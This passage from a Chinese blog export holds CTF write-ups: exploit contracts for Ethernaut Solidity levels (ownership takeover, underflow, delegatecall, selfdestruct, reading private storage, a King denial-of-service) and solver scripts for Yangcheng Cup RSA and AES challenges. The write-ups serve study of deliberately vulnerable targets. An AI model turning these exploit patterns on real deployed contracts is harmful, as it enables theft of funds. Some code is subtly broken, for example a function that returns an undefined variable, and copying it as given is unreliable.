<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone&#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    Telephone tele;</span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        tele = Telephone(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function atta() public&#123;</span><br><span class="line">        tele.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>做完后题目还给了个攻击案例：</p>
<p><img src="/images/ethernaut/image-20230406112041546.png" alt="image-20230406112041546"></p>
<h1 id="token"><strong>Token</strong></h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下溢的洞，直接转账就行。</p>
<h1 id="delegation"><strong>Delegation</strong></h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察的是delegationcall</p>
<ul>
<li><p>call: 调用后内置变量 msg
的值会修改为<strong>调用者</strong>，执行环境为被<strong>调用者的运行环境</strong></p></li>
<li><p>delegatecall: 调用后内置变量 msg
的值<strong>不会修改为调用者</strong>，但执行环境为<strong>调用者的运行环境</strong>（相当于复制被调用者的代码到调用者合约）</p></li>
<li><p>callcode: 调用后内置变量 msg
的值会修改为调用者，但执行环境为调用者的运行环境</p>
<p>由于执行环境是调用者（Delegation）的环境，所以pwn()调用后，修改的是Delegation的owner=msg.sender，又因为不会改msg.sender，所以Delegation的owner变成了我们的账户地址。</p></li>
</ul>
<p>参数可以本地算：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function func() public view returns (bytes4)&#123;</span><br><span class="line">        return bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#0xdd365b8b</span><br></pre></td></tr></table></figure>
<p>也可以在js里算<code>web3.utils.keccak256("pwn()").slice(0, 10)</code>：</p>
<p><img src="../images/ethernaut/image-20230406114824062.png" alt="image-20230406114824062"></p>
<p>为什么是slice前十个：</p>
<ol type="1">
<li>为什么要写web3.utils.keccak256()？这里面有两个问题，第一，写keccak()必须要加上前面的web3.utils，才能引入keccak()方法。第二，keccak()是一种被选定为SHA-3标准的单向散列函数算法，大概是一个海绵体结构，有吸入和挤出阶段。</li>
<li>为什么用slice(0,10)？以下补充一些solidity的函数选择器知识。</li>
</ol>
<p><strong>函数选择器知识补充：</strong></p>
<p>一个函数<strong>调用数据的前 4 字节</strong>，指定了要调用的函数。
这就是某个函数签名的 Keccak 哈希的前 4 字节（高位在左的大端序）。</p>
<p>（但是传入的数据仍然需要前10个才能被正确解析）</p>
<p><img src="/images/ethernaut/image-20230406115805637.png" alt="image-20230406115805637"></p>
<p><img src="/images/ethernaut/image-20230406115819488.png" alt="image-20230406115819488"></p>
<p>后记： <a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">The
Parity Wallet Hack Explained</a>介绍了一个攻击案例</p>
<h1 id="force">Force</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>
<p>目标是强行向合约转账，考点为selfdestruct：</p>
<p>selfdestruct函数是一个自毁函数，当调用它时，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    constructor()  payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address payable _addr) public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后记：</p>
<p><img src="/images/ethernaut/image-20230406171745559.png" alt="image-20230406171745559"></p>
<h1 id="vault">Vault</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标是把locked设为false，那么需要得到password</p>
<p>尽管password设为private，但这只是限制外部合约访问这个变量，数据保存在区块链上是透明的，可以直接用getStorageAt函数获取:</p>
<p><code>web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);</code></p>
<p><img src="/images/ethernaut/image-20230406174556548.png" alt="image-20230406174556548"></p>
<p>把数据放进remix里就能直接解析出来<img src="/images/ethernaut/image-20230406174623483.png" alt="image-20230406174623483"></p>
<p>后记：</p>
<p><img src="/images/ethernaut/image-20230406175010825.png" alt="image-20230406175010825"></p>
<h1 id="king"><strong>King</strong></h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标是发送大于1000000000000000的wei成为king，而且不能让目标合约替代自己成为king</p>
<p>考察的是transfer函数：</p>
<p><img src="/images/ethernaut/image-20230406182805634.png" alt="image-20230406182805634"></p>
<p>如果transfer执行失败会进行回退，而call和send函数则不是，而是返回一个false</p>
<p>用 remix 部署合约，只需要构造一个没有 payable
的回退函数或者压根没有fallback函数，就接收不到金额了</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    function attack(address _addr) public payable&#123;</span><br><span class="line">        _addr.call.gas(10000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/ethernaut/image-20230406183005656.png" alt="image-20230406183005656"></p>
<p>后记：</p>
<p>Most of Ethernaut's levels try to expose (in an oversimplified form
of course) something that actually happened — a real hack or a real
bug.</p>
<p>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King
of the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html">King of the Ether
Postmortem</a>.</p>
<h1 id="re-entrancy"><strong>Re-entrancy</strong></h1>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>introduction to modern cryptography</title>
    <url>/2023/10/08/2023/introduction-to-modern-cryptography/</url>
    <content><![CDATA[<p>开个坑，看今年搞不搞的完</p>
<span id="more"></span>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>book</tag>
        <tag>cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯</title>
    <url>/2021/09/12/2021/%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
    <content><![CDATA[<p>z做了五道。话说最后一题sm4之后是个什么玩意？</p>
<span id="more"></span>
<h1 id="crypto">Crypto</h1>
<h2 id="bigrsa">Bigrsa</h2>
<p>签到题，模不互素，gcd求公共因子后就能分解了，之后就是最简单的RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1=<span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2=<span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=gmpy2.gcd(n1,n2)</span><br><span class="line">q1=n1//p</span><br><span class="line">q2=n2//p</span><br><span class="line">phi1=(p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2=(p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line">d1=gmpy2.invert(e,phi1)</span><br><span class="line">d2=gmpy2.invert(e,phi2)</span><br><span class="line">c=<span class="built_in">pow</span>(c,d2,n2)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d1,n1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="easy_rsa">Easy_RSA</h2>
<p>根据生成可以知道p-1和q-1smooth，并且存在公共因子也就是2g，看书之后了解到这玩意叫Common
prime RSA<img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912095325832.png" alt="image-20210912095325832"></p>
<p>因为这一题的n不大，所以a也不大，并且在模n有限域的情况下<span class="math display">\[x^n-1\]</span>最多就只有a个元素，那么可以考虑用Pollard
rho算法分解n。其中f函数为<span class="math display">\[f(x)=x^{n-1}+3\;mod\;n\]</span>，首先随机生成一个数x1，x2可以由f(x1)生成，然后每轮x1执行一次f，x2执行两次f（提高效率）p=gcd(|x1-x2|,n)，当p不为1或n时可成功分解n。</p>
<p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912100142590.png" alt="image-20210912100142590"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard_rho</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1 = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        x2 = f(x1, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(x1 - x2), n)</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x1 = f(x1, n)</span><br><span class="line">                x2 = f(f(x2, n), n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p,q=pollard_rho(n)</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ringringring">RingRingRing</h2>
<p>nc后第一步是爆破md5，这里爆破了四位。</p>
<p>之后是要解一个方程： <span class="math display">\[
a^4+b^4+c^4+d^4=e^2
\]</span>
一开始以为是什么著名的曲线，查了一下没找到。突然想到这玩意没说abcd不能相等啊，相等时
<span class="math display">\[
4x^4=e^2\\
∴e=2x^2
\]</span> 嗯？？？这是什么意思，那传1—100不就可以了🐎？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dehash</span>(<span class="params">s,re</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s,re)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=a+b+c+d+s</span><br><span class="line">                    <span class="keyword">if</span>  md5(ss.encode()).hexdigest().startswith(re):</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">    p=remote(<span class="string">&#x27;192.168.41.60&#x27;</span>,<span class="number">2378</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;md5(str + &quot;</span>)</span><br><span class="line">    s= p.recvuntil(<span class="string">&quot;)[0:5] == &quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    hashre=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(s,hashre)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot; Give me xxxxx:&quot;</span>)</span><br><span class="line">    p.sendline(dehash(s.decode(),hashre.decode()).encode())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;a: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;b: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;c: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;d: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;e: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">2</span>*i**<span class="number">2</span>).encode())</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<h2 id="rsa">Rsa?</h2>
<p>根据代码前面的生成有： <span class="math display">\[
M_y=flag,M_x=os.urandom(30)\\
Z=M_xM_y\;mod \;n\\
X=\frac{Z+\frac{1}{Z}}{2}\\
Y=M_y\\
a=\frac{\frac{1}{Z}-X}{Y},D=a^2
\]</span></p>
<p>这题定义了一个新的运算模式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xy = <span class="keyword">lambda</span> (x1,y1),(x2,y2) : ((x1*x2+D*y1*y2)%n, (x1*y2+x2*y1)%n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getloop</span>(<span class="params">(<span class="params">x,y</span>), e</span>):</span><br><span class="line">	ret = (x, y)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e-<span class="number">1</span>):</span><br><span class="line">		ret = xy(ret, (x,y))</span><br><span class="line">	<span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>
<p>之后对（X，Y）进行了e次这样的运算。</p>
<p>一开始想到ECC是不可逆的，所以默认了这个运算也是不可逆的，导致做了很多无用功。后来测试代码自定义数据进行计算的时候发现这个运算是可逆的，并且与a无关，也就是说a为任何值都是可逆的。所以接下来只需要拿到n的阶就能够还原X和Y（flag），现在考虑如何分解n。</p>
<p>由于没有其他信息可用了，那么只能硬着头皮开根号呗，没想到还真出了，那么之后就可以解了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023</span></span><br><span class="line">x=gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> x**<span class="number">2</span>-n&lt;=<span class="number">0</span>:</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">1</span>] :</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line">y=gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p=x+y</span><br><span class="line">q=x-y</span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还有一个点，因为对e求逆后的数据很大，用原始的loop跑的很慢很慢，所以需要改成快速幂。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a=<span class="number">1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023</span></span><br><span class="line">x=gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> x**<span class="number">2</span>-n&lt;=<span class="number">0</span>:</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">1</span>] :</span><br><span class="line">    x+=<span class="number">1</span></span><br><span class="line">y=gmpy2.iroot(x**<span class="number">2</span>-n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p=x+y</span><br><span class="line">q=x-y</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="keyword">assert</span> p*q==n</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">D=a**<span class="number">2</span>%n</span><br><span class="line"></span><br><span class="line">xy = <span class="keyword">lambda</span> x,y : ((x[<span class="number">0</span>]*y[<span class="number">0</span>]+D*x[<span class="number">1</span>]*y[<span class="number">1</span>])%n, (x[<span class="number">0</span>]*y[<span class="number">1</span>]+y[<span class="number">0</span>]*x[<span class="number">1</span>])%n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getloop</span>(<span class="params">x, e</span>):</span><br><span class="line">    res = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> e!=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> e &amp; <span class="number">1</span>:</span><br><span class="line">            res = xy(res, x)</span><br><span class="line">        x = xy(x, x)</span><br><span class="line">        e = e &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">(xx,yy)=getloop((<span class="number">5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110</span>, <span class="number">2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785</span>),d)</span><br><span class="line"></span><br><span class="line">Mx=(<span class="number">2</span>*yy*xx-<span class="number">1</span>)*(gmpy2.invert(yy,n)**<span class="number">2</span>)%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(yy))</span><br></pre></td></tr></table></figure>
<p>话说这题flag解出来是pell方程很有趣，可是除了在loop里x运算用到了pell方程外似乎没有用到了呀，难道非预期？</p>
<h2 id="miss">MISS</h2>
<p>这一题出题人自己写了个AES，查看代码后发现key一点用也没有，也就是说主要的流程都集中在这里：<img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912102743034.png" alt="image-20210912102743034"></p>
<p>那么理论上只需要简单的逆一下AES就行了。</p>
<p>res是16字的，subBytes操作是四字节一起运算，那么这一题和Xman结营时的re题一模一样！怀疑出题人是同一个(</p>
<p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912103027685.png" alt="image-20210912103027685"></p>
<p>之前做的时候就是用C语言爆破，因为4字节一起所以运算量变成了256^4，现代计算机很容易就能跑出来</p>
<p>，把之前的代码改一下就能用了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">锘?include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> SBox[] = &#123;</span><br><span class="line">	<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">	<span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">	<span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">	<span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">	<span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">	<span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">	<span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">	<span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">	<span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span 